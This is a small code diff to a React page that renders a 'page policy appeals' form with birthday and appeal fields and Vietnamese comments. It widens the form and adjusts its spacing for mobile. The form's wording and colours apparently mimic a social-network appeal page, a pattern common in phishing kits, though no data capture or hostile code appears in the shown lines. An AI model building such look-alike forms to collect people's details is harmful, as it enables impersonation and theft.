@@ -310,7 +310,7 @@ const Home = () => {
                     })}
                 </nav>
                 <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
-                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-8 w-full max-w-lg'>
+                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 w-full max-w-2xl'>
                         <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                             <p className='text-2xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                         </div>
@@ -385,7 +385,7 @@ const Home = () => {
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            {/* PHẦN "KHIẾU NẠI CỦA BẠN" */}
+                            {/* PHẦN "KHIẾU NẠI CỦA BẠN" ĐÃ ĐƯỢC SỬA CHO MOBILE */}
                             <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
